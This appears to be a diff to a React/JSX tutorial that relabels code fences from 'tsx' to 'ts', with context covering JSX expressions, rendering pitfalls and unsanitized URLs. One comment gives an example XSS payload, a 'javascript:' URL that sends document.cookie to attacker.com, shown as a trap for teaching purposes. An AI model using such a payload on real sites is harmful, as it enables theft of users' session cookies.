@@ -124,7 +124,7 @@ Let's look at real code demonstrating how JSX looks in your source file, how the
 
 Here is a typical React component:
 
-```tsx
+```ts
 import { useState } from 'react';
 
 interface CardProps {
@@ -217,7 +217,7 @@ console.log('Shape:', {
 
 JSX only allows JavaScript expressions inside curly braces `{}`. An expression evaluates to a value; a statement executes an action.
 
-```tsx
+```ts
 function NotificationBanner({ status, unreadCount }: { status: 'online' | 'offline'; unreadCount: number }) {
   const formatTime = () => new Date().toLocaleTimeString();
 
@@ -309,7 +309,7 @@ However, security vulnerabilities can still arise in three specific scenarios:
 
 A common pattern for conditional rendering is the logical AND operator `&&`. However, JavaScript short-circuits to the left-hand operand if it is falsy.
 
-```tsx
+```ts
 function NotificationList({ messages }: { messages: string[] }) {
   // WRONG: When messages is empty, messages.length is 0.
   // In JavaScript: 0 && <List /> evaluates to the number 0!
@@ -342,7 +342,7 @@ function NotificationListFixed({ messages }: { messages: string[] }) {
 
 JSX can render strings, numbers, elements, and arrays of elements. It cannot render arbitrary plain JavaScript objects as children.
 
-```tsx
+```ts
 function UserGreeting({ user }: { user: { name: string; role: string } }) {
   // WRONG: Attempting to render the raw object will throw a runtime error:
   // "Error: Objects are not valid as a React child (found: object with keys {name, role})"
@@ -357,7 +357,7 @@ function UserGreeting({ user }: { user: { name: string; role: string } }) {
 
 In standard HTML, you write `style="margin-top: 10px; background-color: red;"`. In JSX, the `style` attribute expects a JavaScript object with camelCased keys.
 
-```tsx
+```ts
 function AlertBox({ message }: { message: string }) {
   // WRONG: Passing a string throws a compile/runtime error
   // return <div style="color: red; margin-top: 10px;">{message}</div>;
@@ -375,7 +375,7 @@ function AlertBox({ message }: { message: string }) {
 
 React automatically escapes text content inside elements, but it does not automatically sanitize URLs passed into `href` or `src` attributes.
 
-```tsx
+```ts
 function UserWebsiteLink({ url }: { url: string }) {
   // TRAP: If url is "javascript:document.location='https://attacker.com/steal?'+document.cookie",
   // clicking the link will execute arbitrary JavaScript!
